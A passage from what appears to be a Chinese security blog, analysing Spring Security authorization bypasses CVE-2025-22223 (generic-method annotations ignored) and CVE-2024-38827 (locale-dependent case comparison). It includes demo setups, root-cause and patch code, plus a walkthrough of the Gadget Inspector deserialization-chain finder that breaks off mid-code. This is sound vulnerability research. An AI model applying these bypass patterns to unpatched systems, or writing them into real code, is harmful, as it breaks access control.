<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecureService</span> <span class="keyword">extends</span> <span class="title class_">SecureServiceParent</span>&lt;String&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">securedMethod</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;This method is accessible by users and admins&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建测试控制器<br>测试控制器方法 <code>test</code> 调用了安全服务的 <code>securedMethod</code> 方法<br>一般来讲因为 <code>@EnableMethodSecurity</code> 注解的配置，所以 <code>@Secured</code> 注解的方法在未登录的情况下无法访问，即此时访问<code>/test</code>接口会响应一个访问被拒绝的响应  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.demo.service.SecureService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> SecureService secureService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> secureService.securedMethod(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将我们的程序跑起来并访问<code>http://127.0.0.1:8080/test</code><br><img src="/archives/93b95985/img_1.png" alt="img_1.png"><br>如上图，我们访问<code>/test</code>接口时并没有登录 <code>securedMethod</code> 方法却成功执行了。<br>这证明当存在泛型时<code>spring security</code>并不能有效的将子类与父类的<code>securedMethod</code>方法识别为同一个，<br>故此时在包含了泛型参数的父类方法中使用的<code>@Secured</code>等注解进行性的访问控制并不能生效。<br>为了进行对比可以修改 <code>securedMethod</code>方法的签名取消掉泛型信息再次对<code>/test</code>接口进行访问，此时页面会被重定向到登录页面。    </p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>我们知道漏洞支持的最高版本为6.4.3 所以我们将6.4.3版本与6.4.4版本进行对比<a href="https://github.com/spring-projects/spring-security/compare/6.4.3...6.4.4">参考比较链接</a>，<br>从而发现在<code>core/src/main/java/org/springframework/security/core/annotation/UniqueSecurityAnnotationScanner.java</code> 类中出现了关键更改<br><img src="/archives/93b95985/img_2.png" alt="img_2.png"><br>在上图的代码中，首先通过反射调用<code>targetClass</code>的<code>getDeclaredMethod</code>以获取当前类的某一个方法得到一个<code>Method</code>对象，然后通过<code>findDirectAnnotations</code>方法获取到该方法的所有注解。<br><code>getDeclaredMethod</code> 方法获取的方法名并不能获取到父类的方法，当存在重写方法时该方法获取到的<code>Method</code>对象只包括当前类声明的方法<br><code>findDirectAnnotations</code> 方法搜索注解的策略是<code>MergedAnnotations.SearchStrategy.DIRECT</code> 即只搜索直接声明在目标元素上的注解，不包括继承的注解，所以此时也获取不到父类方法的注解。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;MergedAnnotation&lt;A&gt;&gt; <span class="title function_">findDirectAnnotations</span><span class="params">(AnnotatedElement element)</span> &#123;</span><br><span class="line">		<span class="type">MergedAnnotations</span> <span class="variable">mergedAnnotations</span> <span class="operator">=</span> MergedAnnotations.from(element, MergedAnnotations.SearchStrategy.DIRECT,</span><br><span class="line">				RepeatableContainers.none());</span><br><span class="line">		<span class="keyword">return</span> mergedAnnotations.stream()</span><br><span class="line">			.filter((annotation) -&gt; <span class="built_in">this</span>.types.contains(annotation.getType()))</span><br><span class="line">			.map((annotation) -&gt; (MergedAnnotation&lt;A&gt;) annotation)</span><br><span class="line">			.toList();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这样就产生了漏洞<br>在实际测试的时候发现只是单纯的在父类方法中声明方法安全注解而不在子类中声明并不会导致漏洞，只有在父类方法包含泛型的时候才会导致漏洞，<br>那么证明这个漏洞逻辑还不够完整，我们看<code>findClosestMethodAnnotations</code>方法中下面的代码  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;MergedAnnotation&lt;A&gt;&gt; annotations = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(</span><br><span class="line">				findClosestMethodAnnotations(method, targetClass.getSuperclass(), classesToSkip));</span><br></pre></td></tr></table></figure>
<p>这里递归调用了<code>findClosestMethodAnnotations</code>方法，第二个参数发生了变化成了<code>targetClass</code>的父类，也就是说在 <code>findClosestMethodAnnotations</code><br>是会递归搜索当前目标类的所有父类或者接口的方法从而查找到所有相关的注解的。这就是为什么普通的方法并不会存在漏洞，那为什么泛型方法会导致漏洞呢？<br>这就要回到<code>173</code>行的代码了    </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">methodToUse</span> <span class="operator">=</span> targetClass.getDeclaredMethod(method.getName(), method.getParameterTypes());</span><br></pre></td></tr></table></figure>
<p>这里获取<code>Method</code>对象的方法是通过方法名以及方法参数列表来查找的，当一个方法是泛型方法时我们看看他的方法参数列表是怎么样的，<br>也就是我们上面<code>SecureServiceParent</code>的<code>securedMethod</code>方法  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> T  <span class="title function_">securedMethod</span><span class="params">(T t)</span>;</span><br></pre></td></tr></table></figure>
<p>其实现类<code>SecureService</code>的<code>securedMethod</code>方法的签名  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">securedMethod</span><span class="params">(String s)</span></span><br></pre></td></tr></table></figure>
<p>两者的不一致导致<code>findClosestMethodAnnotations</code>在查找子类泛型方法的父类实现时找不到，也就不能获取到父类方法上的注解，从而导致漏洞。  </p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方新增了 <code>findMethod</code>方法来进行方法查找  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Method <span class="title function_">findMethod</span><span class="params">(Method method, Class&lt;?&gt; targetClass)</span> &#123;</span><br><span class="line">		<span class="keyword">for</span> (Method candidate : targetClass.getDeclaredMethods()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (candidate == method) &#123;</span><br><span class="line">				<span class="keyword">return</span> candidate;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (isOverride(method, candidate)) &#123; <span class="comment">// 对重写方法进行特殊处理</span></span><br><span class="line">				<span class="keyword">return</span> candidate;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isOverride</span><span class="params">(Method rootMethod, Method candidateMethod)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (!Modifier.isPrivate(candidateMethod.getModifiers()) <span class="comment">// 非private方法</span></span><br><span class="line">        &amp;&amp; candidateMethod.getName().equals(rootMethod.getName()) <span class="comment">// 方法名一致</span></span><br><span class="line">        &amp;&amp; hasSameParameterTypes(rootMethod, candidateMethod)); <span class="comment">// 判断参数类型是否一致，针对泛型参数进行特殊处理</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">hasSameParameterTypes</span><span class="params">(Method rootMethod, Method candidateMethod)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (candidateMethod.getParameterCount() != rootMethod.getParameterCount()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Class&lt;?&gt;[] rootParameterTypes = rootMethod.getParameterTypes(); <span class="comment">// 获取子类方法的参数列表</span></span><br><span class="line">        Class&lt;?&gt;[] candidateParameterTypes = candidateMethod.getParameterTypes(); <span class="comment">// 获取父类方法的参数列表</span></span><br><span class="line">        <span class="keyword">if</span> (Arrays.equals(candidateParameterTypes, rootParameterTypes)) &#123; <span class="comment">// 如果参数列表一致则返回证明是同一个方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hasSameGenericTypeParameters(rootMethod, candidateMethod, rootParameterTypes); <span class="comment">// 针对泛型参数做特殊处理</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">hasSameGenericTypeParameters</span><span class="params">(Method rootMethod, Method candidateMethod,</span></span><br><span class="line"><span class="params">        Class&lt;?&gt;[] rootParameterTypes)</span> &#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; sourceDeclaringClass = rootMethod.getDeclaringClass(); <span class="comment">// 查找根方法的声明类 重写方法的声明位置在父类中</span></span><br><span class="line">        Class&lt;?&gt; candidateDeclaringClass = candidateMethod.getDeclaringClass(); <span class="comment">// 查找父类方法的声明类</span></span><br><span class="line">        <span class="keyword">if</span> (!candidateDeclaringClass.isAssignableFrom(sourceDeclaringClass)) &#123;<span class="comment">// 判断某个类是否是另一个类的父类（包括直接父类和间接父类）、接口或相同类 主要是判断是否是同一个类 如果条件不满足返回false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; rootParameterTypes.length; i++) &#123;</span><br><span class="line">        Class&lt;?&gt; resolvedParameterType = ResolvableType.forMethodParameter(candidateMethod, i, sourceDeclaringClass)<span class="comment">// 解析泛型参数的实际参数类型</span></span><br><span class="line">        .resolve();</span><br><span class="line">        <span class="keyword">if</span> (rootParameterTypes[i] != resolvedParameterType) &#123;<span class="comment">// 根方法的参数列表挨个与解析出来的实际参数类型比较 如果不一致则返回false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
<li><a href="https://github.com/spring-projects/spring-security/compare/6.4.3...6.4.4">代码diff</a></li>
<li><a href="https://spring.io/security/cve-2025-22223">CVE-2025-22223: Spring Security authorization bypass for method security annotations on parameterized types</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
        <category>spring</category>
      </categories>
      <tags>
        <tag>认证绕过</tag>
        <tag>漏洞分析</tag>
        <tag>Spring Security</tag>
        <tag>EnableMethodSecurity</tag>
        <tag>CVE-2025-22223</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring-Security大小写敏感比较授权绕过（CVE-2024-38827）</title>
    <url>/archives/60afcc6f.html</url>
    <content><![CDATA[<h1 id="Spring-Security大小写敏感比较授权绕过（CVE-2024-38827）"><a href="#Spring-Security大小写敏感比较授权绕过（CVE-2024-38827）" class="headerlink" title="Spring-Security大小写敏感比较授权绕过（CVE-2024-38827）"></a>Spring-Security大小写敏感比较授权绕过（CVE-2024-38827）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><img src="/archives/60afcc6f/img.png" alt="img.png"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>很明显的原理了，在不同的语言环境中<code>String.toLowerCase()</code> 与 <code>String.toUpperCase()</code> 得到的结果不一致导致可能的授权绕过。<br>比如在英文环境：i 的大写为 I<br>在土耳其语环境中 i 的大写为 İ<br>这种不一致导致可能的绕过。<br>然而在实践中这种情况发生的概率几乎为零。<br>举个例子，在Spring Security的补丁中由下面的修改<br><img src="/archives/60afcc6f/img_1.png" alt="img_1.png"><br><code>InMemoryUserDetailsManager</code> 的<code>createUser</code>方法中在调用 <code>toLowerCase</code>方法对用户名进行处理的时候严格限制了本地化方案。<br>设想这样一种场景，一个应用在启动的时候会调用 <code>InMemoryUserDetailsManager</code> 创建一些默认用户，如下面的代码  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> UserDetailsService <span class="title function_">userDetailsService</span><span class="params">()</span> &#123;</span><br><span class="line">        Locale.setDefault(<span class="keyword">new</span> <span class="title class_">Locale</span>(<span class="string">&quot;tr&quot;</span>, <span class="string">&quot;TR&quot;</span>)); <span class="comment">// 设置当前语言环境为土耳其语</span></span><br><span class="line">        <span class="type">UserDetails</span> <span class="variable">user</span> <span class="operator">=</span> User.withDefaultPasswordEncoder()</span><br><span class="line">                .username(<span class="string">&quot;useri&quot;</span>)</span><br><span class="line">                .password(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">                .roles(<span class="string">&quot;USER&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InMemoryUserDetailsManager</span>(user);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>InMemoryUserDetailsManager</code>实例化是最终会调用到<code>createUser</code>方法。<br>在某一个控制器中提供了另一个套逻辑用于动态的增加用户，如下面的代码  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">blog</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">UserDetails</span> <span class="variable">user</span> <span class="operator">=</span> User.withDefaultPasswordEncoder()</span><br><span class="line">            .username(<span class="string">&quot;userİ&quot;</span>)</span><br><span class="line">            .password(<span class="string">&quot;password123&quot;</span>)</span><br><span class="line">            .roles(<span class="string">&quot;USER&quot;</span>)</span><br><span class="line">            .build();</span><br><span class="line">    <span class="keyword">if</span> (userDetailsService <span class="keyword">instanceof</span> InMemoryUserDetailsManager) &#123;</span><br><span class="line">        ((InMemoryUserDetailsManager) userDetailsService).createUser(user);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.ok(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>添加用户时使用的是用户名<code>userİ</code> 其在被添加时会被转为小写<code>useri</code>，攻击者可能通过这种方式尝试去覆盖掉默认用户的密码，这看似时可行的，可事实真的如此吗<br>在调用<code>createUser</code>的时候会调用<code>userExists</code>方法检查当前用户是否存在    </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.users.containsKey(username.toLowerCase());  </span><br></pre></td></tr></table></figure>
<p>此处对用户输入的用户名进行了小写处理，所以当用户名是<code>userİ</code>时，<code>userExists</code>方法会返回true，从而导致<code>createUser</code>方法会直接返回，不能覆盖添加用户。<br>这样看起来这个漏洞时很鸡肋的，Spring Security做出的修改貌似也只是为了避免一种绕过的可能性。<br>那么什么情况下会存在绕过呢？<br>一个是当前系统的语言环境发生了变化却仍然沿用老数据的时候。<br>另一种情况是在进行一些比较的时候<br>例如，开发者在开发时按照ascii标准进行大小写变换处理，假设由一个用户<code>admin</code>是管理员账户，通过将<code>admin</code>转换为大写<code>ADMIN</code>从而获得到其角色，然后与<br><code>ADMIN</code>做比较确认其具有管理员权限。<br>此时如果程序运行在土耳其语的语言环境中，用户输入用户名<code>admin</code>，此时转换为大写为<code>ADMİN</code>与<code>ADMIN</code>比较导致比较结果为false，从而导致系统拒绝<code>admin</code>用户访问。<br>这个例子算是拒绝访问，认证绕过就是需要在某个语言环境中存在某一个特殊的字符串转为大写后等于<code>ADMIN</code>，从而使得该用户具有了管理员权限从而完成提权。<br>总之是一个很难使用的漏洞</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://spring.io/security/cve-2024-38827">CVE-2024-38827: Spring Security Authorization Bypass for Case Sensitive Comparisons</a></li>
<li><a href="https://spring.io/security/cve-2024-38829">CVE-2024-38829: Spring LDAP Spring LDAP sensitive data exposure for case-sensitive comparisons</a></li>
<li><a href="https://github.com/spring-projects/spring-security/compare/6.3.4...6.3.5">代码diff</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Spring Security</tag>
        <tag>CVE-2024-38827</tag>
        <tag>CVE-2024-38829</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Gadgets搜索工具是如何工作的-Gadget Inspector</title>
    <url>/archives/a580d790.html</url>
    <content><![CDATA[<h1 id="Java-Gadgets-搜索工具是如何工作的（Gadget-Inspector）"><a href="#Java-Gadgets-搜索工具是如何工作的（Gadget-Inspector）" class="headerlink" title="Java Gadgets 搜索工具是如何工作的（Gadget Inspector）"></a>Java Gadgets 搜索工具是如何工作的（Gadget Inspector）</h1><p>Gadget Inspector 由 Ian Haken 于 2018 年 8 月在  DEF CON 上发布，其发布开创了Gadget 自动化挖掘的先河。Gadget Inspector 依靠Java ASM<br>技术，通过静态模拟 Java 程序运行过程中操作数栈以及局部变量表的动态变化来进行数据流跟踪从而实现污点分析进而进行Gadgets探测。  </p>
<h3 id="检测原理"><a href="#检测原理" class="headerlink" title="检测原理"></a>检测原理</h3><p>Gadget Inspector 的核心逻辑包含5个步骤，分别是类信息分析、数据传播分析、调用图构造、入口探测以及Gadgets串联。<br>在第一步中 Gadget Inspector 利用 MethodDiscovery 类对 当前环境中所有类的方法、成员、继承结构进行解析并集中存储在特定的数据结构中以便后续进行<br>数据传播分析以及调用图构造。<br>在第二步中 Gadget Inspector 利用 PassthroughDiscovery 类运用 深度优先算法、逆拓扑排序等方式进行数据流分析从而确认方法入参与返回值的关系，<br>即入参是否能够污染到返回值，其根本目的在于确认关键参数是否可以被攻击者控制。<br>在第三步中 Gadget Inspector 通过 Java ASM 技术构造方法调用图，其目的在于确认主调方法与被调用方法参数之间的关系。<br>第四步中 Gadget Inspector 通过 SourceDiscovery 针对不同的夫序列化类型进行分发，通过对比第一步中形成的methodMap中存储的方法信息与预定义<br>的反序列化 Gadget Source点进行比较，从而确定当前项目中可被使用的反序列化入口方法。<br>在第五步中 Gadget  Inspector 开始从Source点开始遍历调用图，直到找到一个方法与预定义的sink点相匹配则说明Gadget Inspector 找到了一条可以<br>使用的反序列化调用链。  </p>
<span id="more"></span>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// Perform the various discovery steps</span></span><br><span class="line">        <span class="comment">// 对类结构进行分析 包括类的方法信息  成员信息等</span></span><br><span class="line">        <span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;classes.dat&quot;</span>)) || !Files.exists(Paths.get(<span class="string">&quot;methods.dat&quot;</span>))</span><br><span class="line">                || !Files.exists(Paths.get(<span class="string">&quot;inheritanceMap.dat&quot;</span>))) &#123;</span><br><span class="line">            LOGGER.info(<span class="string">&quot;Running method discovery...&quot;</span>);</span><br><span class="line">            <span class="type">MethodDiscovery</span> <span class="variable">methodDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodDiscovery</span>();</span><br><span class="line">            methodDiscovery.discover(classResourceEnumerator);</span><br><span class="line">            methodDiscovery.save();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 对方法的入参与返回值的关系进行分析</span></span><br><span class="line">        <span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;passthrough.dat&quot;</span>))) &#123;</span><br><span class="line">            LOGGER.info(<span class="string">&quot;Analyzing methods for passthrough dataflow...&quot;</span>);</span><br><span class="line">            <span class="type">PassthroughDiscovery</span> <span class="variable">passthroughDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PassthroughDiscovery</span>();</span><br><span class="line">            passthroughDiscovery.discover(classResourceEnumerator, config);</span><br><span class="line">            passthroughDiscovery.save();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 对方法调用之间参数的关系进行分析</span></span><br><span class="line">        <span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>))) &#123;</span><br><span class="line">            LOGGER.info(<span class="string">&quot;Analyzing methods in order to build a call graph...&quot;</span>);</span><br><span class="line">            <span class="type">CallGraphDiscovery</span> <span class="variable">callGraphDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CallGraphDiscovery</span>();</span><br><span class="line">            callGraphDiscovery.discover(classResourceEnumerator, config);</span><br><span class="line">            callGraphDiscovery.save();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 根据预定义规则查找所有的source点</span></span><br><span class="line">        <span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;sources.dat&quot;</span>))) &#123;</span><br><span class="line">            LOGGER.info(<span class="string">&quot;Discovering gadget chain source methods...&quot;</span>);</span><br><span class="line">            <span class="type">SourceDiscovery</span> <span class="variable">sourceDiscovery</span> <span class="operator">=</span> config.getSourceDiscovery();</span><br><span class="line">            sourceDiscovery.discover();</span><br><span class="line">            sourceDiscovery.save();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#123;   </span><br><span class="line">            <span class="comment">// 查找 gadget chain</span></span><br><span class="line">            LOGGER.info(<span class="string">&quot;Searching call graph for gadget chains...&quot;</span>);</span><br><span class="line">            <span class="type">GadgetChainDiscovery</span> <span class="variable">gadgetChainDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GadgetChainDiscovery</span>(config);</span><br><span class="line">            gadgetChainDiscovery.discover();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LOGGER.info(<span class="string">&quot;Analysis complete!&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h4 id="类结构分析"><a href="#类结构分析" class="headerlink" title="类结构分析"></a>类结构分析</h4><p>Gadget Inspector 针对项目中的类的结构分析开始于 MethodDiscovery 类的 discover 方法。<br>classResourceEnumerator 类存储了当前项目中所有被指定的需要分析的类信息，包括用户指定的jar包、JDK原生的依赖库。通过获取每一个类的字节码流将其传递给<br>ASM框架的ClassVisitor对每一个类进行解析。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> classResource.getInputStream()) &#123;</span><br><span class="line">                <span class="type">ClassReader</span> <span class="variable">cr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(in);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    cr.accept(<span class="keyword">new</span> <span class="title class_">MethodDiscoveryClassVisitor</span>(), ClassReader.EXPAND_FRAMES);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    LOGGER.error(<span class="string">&quot;Exception analyzing: &quot;</span> + classResource.getName(), e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>MethodDiscoveryClassVisitor 类是 ASM 框架 ClassVisitor 类的实现类，在当前步骤中 MethodDiscoveryClassVisitor 主要通过实现 ClassVistor<br>的 visit visitField visitMethod visitEnd 方法类对类的字段、方法进行分析。<br>上述四个方法将按照顺序依次调用，首先是visit方法被调用，用于访问类的基本信息（如版本、访问标志、类名、父类名、接口等），它标志着类的开始。<br>需要特别说明的是 ClassReference.Handle 表示某一个类的处理句柄，Gadget Inspector将类名封装到该类中用以作为后续步骤中从各种数据结构中访问类信息的句柄<br>不仅类名被封装通过句柄访问，后续类方法以及类成员信息同样被封装为句柄。与类不同方法句柄将不经包含方法名信息，还将包括方法签名、返回值等信息。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span> <span class="params">( <span class="type">int</span> version, <span class="type">int</span> access, String name, String signature, String superName, String[]interfaces)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.superName = superName;</span><br><span class="line">            <span class="built_in">this</span>.interfaces = interfaces;</span><br><span class="line">            <span class="built_in">this</span>.isInterface = (access &amp; Opcodes.ACC_INTERFACE) != <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">this</span>.members = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="built_in">this</span>.classHandle = <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(name);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>当 visit 方法调用完毕后，visitField方法会被调用，用于访问类中的每个字段。如果存在多个字段，visitField会为每个字段单独调用依次。<br>该重载方法中对字段的访问修饰符进行了判断，如果当前字段的访问修饰符为 ACC_STATIC 即被 static 关键词修饰则步记录该字段到 members 变量中。<br>这是因为静态字段在类加载时被初始化不能被攻击者所控制修改，于反序列化漏洞无益。针对引用数据类型Object以及Array，Gadget Inspector只获取其内部类型<br>而不必获取其完整的类型描述符，如：变量 String s，其类型描述符为 Ljava&#x2F;lang&#x2F;String;，而其内部类型为 java&#x2F;lang&#x2F;String。<br>类成员信息最终被封装为 ClassReference.Member 类并存储在 members 变量中，该类封装了字段名、访问修饰符以及字段类型。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc,</span></span><br><span class="line"><span class="params">                                       String signature, Object value)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> Type.getType(desc);</span><br><span class="line">                String typeName;</span><br><span class="line">                <span class="keyword">if</span> (type.getSort() == Type.OBJECT || type.getSort() == Type.ARRAY) &#123;</span><br><span class="line">                    typeName = type.getInternalName();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    typeName = type.getDescriptor();</span><br><span class="line">                &#125;</span><br><span class="line">                members.add(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Member(name, access, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(typeName)));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>在所有字段都被访问完后，visitMethod 方法会被调用，用于访问类中的每个方法。如果有多个方法，visitMethod 会为每个方法依次调用一次。<br>visitMethod方法将当前类中所有的方法封装为 MethodReference 类，并最终被存储在 discoveredMethods 变量中。<br>需要特别注意的是在进行方法信息存储是存储了当前方法是否是类方法，该信息主要在后续进行数据流传播分析时对静态方法进行特殊处理。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isStatic</span> <span class="operator">=</span> (access &amp; Opcodes.ACC_STATIC) != <span class="number">0</span>;</span><br><span class="line">            discoveredMethods.add(<span class="keyword">new</span> <span class="title class_">MethodReference</span>(</span><br><span class="line">                    classHandle,</span><br><span class="line">                    name,</span><br><span class="line">                    desc,</span><br><span class="line">                    isStatic));</span><br><span class="line">            <span class="keyword">return</span> <span 